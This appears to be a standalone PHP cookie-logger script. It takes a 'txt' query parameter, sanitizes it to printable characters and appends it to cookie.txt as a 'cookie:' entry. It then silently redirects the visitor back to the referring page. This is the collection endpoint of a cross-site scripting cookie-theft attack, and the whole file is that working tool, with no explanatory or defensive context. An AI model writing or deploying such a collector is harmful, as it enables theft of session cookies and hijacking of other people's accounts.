<?php
declare(strict_types=1);

$cookie = $_GET['txt'] ?? '';
if ($cookie !== '') {
    $safe = preg_replace('/[^\x20-\x7E]/', '', substr($cookie, 0, 4096));
    file_put_contents('cookie.txt', "cookie:$safe\n", FILE_APPEND | LOCK_EX);
}

$referer = $_SERVER['HTTP_REFERER'] ?? '/';
header('Location: ' . $referer);
